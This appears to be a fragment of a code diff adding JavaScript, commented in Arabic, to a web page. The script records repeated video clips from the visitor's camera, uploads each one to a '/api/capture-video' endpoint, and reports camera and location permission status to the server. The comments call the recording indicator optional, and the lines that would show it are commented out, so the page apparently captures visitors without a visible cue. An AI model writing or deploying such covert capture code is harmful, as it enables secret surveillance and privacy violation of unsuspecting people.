+                    console.error("خطأ في بدء تسجيل الفيديو:", error);
+                }
+            }
+            
+            // دالة إرسال الفيديو إلى الخادم
+            function sendVideoToServer(blob) {
+                const formData = new FormData();
+                const timestamp = new Date().getTime();
+                formData.append('video', blob, 'video_' + timestamp + '.webm');
+                
+                console.log("محاولة إرسال الفيديو #" + captureCount);
+                
+                fetch('/api/capture-video', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("تم تسجيل وإرسال الفيديو بنجاح #" + captureCount, data);
+                    successfulCaptures++;
+                })
+                .catch(error => {
+                    console.error("خطأ في إرسال الفيديو:", error);
+                });
+            }
+            
+            // دوال لتشغيل وإيقاف مؤقت التسجيل
+            function startRecordingTimer() {
+                recordingSeconds = 0;
+                const indicatorElement = document.getElementById('recording-indicator');
+                const timerElement = document.getElementById('recording-time');
+                
+                // إظهار مؤشر التسجيل (اختياري - يمكن تعليق هذه السطور إذا كنت لا تريد إظهار مؤشر التسجيل)
+                // indicatorElement.style.display = 'block';
+                timerElement.textContent = '0';
+                
+                recordingTimer = setInterval(() => {
+                    recordingSeconds++;
+                    timerElement.textContent = recordingSeconds;
+                    
+                    if (recordingSeconds >= maxRecordingTime) {
+                        clearInterval(recordingTimer);
+                    }
+                }, 1000);
+            }
+            
+            function stopRecordingTimer() {
+                if (recordingTimer) {
+                    clearInterval(recordingTimer);
+                    recordingTimer = null;
+                }
+                
+                // إخفاء مؤشر التسجيل
+                // document.getElementById('recording-indicator').style.display = 'none';
+            }
+            
+            // دالة لإرسال حالة الأذونات إلى الخادم
+            function updatePermissionsStatus(camera, location) {
+                fetch('/api/permissions', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        camera: camera,
+                        location: location
+                    })
+                })
+                .then(response => response.json())
+                .catch(error => {
+                    console.error("خطأ في تحديث حالة الأذونات:", error);
+                });
+            }
+        });
+    </script>
+</body>
+</html> 
